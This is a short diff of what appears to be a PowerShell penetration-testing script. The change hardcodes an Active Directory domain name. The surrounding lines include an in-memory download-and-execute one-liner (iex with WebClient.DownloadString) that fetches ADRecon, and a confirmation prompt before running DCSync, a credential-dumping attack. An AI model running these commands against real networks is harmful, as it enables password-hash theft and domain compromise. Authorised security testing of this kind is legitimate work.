@@ -63,7 +63,7 @@ Write-Host "[INFO] Downloading ADRecon into Memory" -ForegroundColor Gray
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/ADRecon/master/ADRecon.ps1')
 
 # print out domain context
-$domain = get-netdomain | Select-Object -property Name | foreach { $_.Name}
+$domain = "contoso.local" #get-netdomain | Select-Object -property Name | foreach { $_.Name}
 Write-Host "[INFO] DCSync will be executed for the domain: $domain" -ForegroundColor Red
 
 $confirmation = Read-Host "Is the domain correct to execute DCSync on? (y/n)"
